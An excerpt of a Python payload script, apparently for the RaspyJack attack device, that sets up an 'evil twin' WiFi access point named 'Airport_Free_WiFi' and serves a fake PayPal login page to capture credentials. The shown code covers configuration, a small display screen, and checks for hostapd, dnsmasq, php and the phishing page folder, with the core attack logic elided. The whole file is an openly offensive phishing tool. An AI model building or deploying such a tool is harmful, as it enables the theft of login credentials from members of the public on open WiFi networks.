#!/usr/bin/env python3
"""
RaspyJack *payload* – **SE: Evil Twin (PayPal Login)**
=======================================================
A social engineering payload that creates a fake WiFi network and serves
a convincing fake PayPal login page to capture credentials.
"""
...
# --- CONFIGURATION ---
WIFI_INTERFACE = "wlan1" # Will be configurable
FAKE_AP_SSID = "Airport_Free_WiFi" # Will be configurable
FAKE_AP_CHANNEL = "11" # Will be configurable
CAPTIVE_PORTAL_BASE_PATH = os.path.join("/root", "Raspyjack", "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "phish_paypal") # Default to phish_paypal
...
current_html_file = "phish_paypal" # Default selected folder
html_files_list = []
html_file_index = 0
...
def draw_ui(screen_state="main", status: str = ""):
    ...
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Evil Twin (PayPal)", font=FONT_TITLE, fill="#0070ba")
    d.line([(0, 22), (128, 22)], fill="#0070ba", width=1)
...
def start_attack():
    ...
    if subprocess.run("which hostapd", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "hostapd not found!"], "red")
        time.sleep(3)
        return False
    if subprocess.run("which dnsmasq", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "dnsmasq not found!"], "red")
        time.sleep(3)
        return False
    if subprocess.run("which php", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "php not found!"], "red")
        time.sleep(3)
        return False
    
    # Check if CAPTIVE_PORTAL_PATH exists
    if not os.path.isdir(CAPTIVE_PORTAL_PATH):
        show_message(["ERROR:", "Phishing page", "not found!"], "red")
        time.sleep(3)
        return False

    # Simplified version of the main evil_twin.py logic
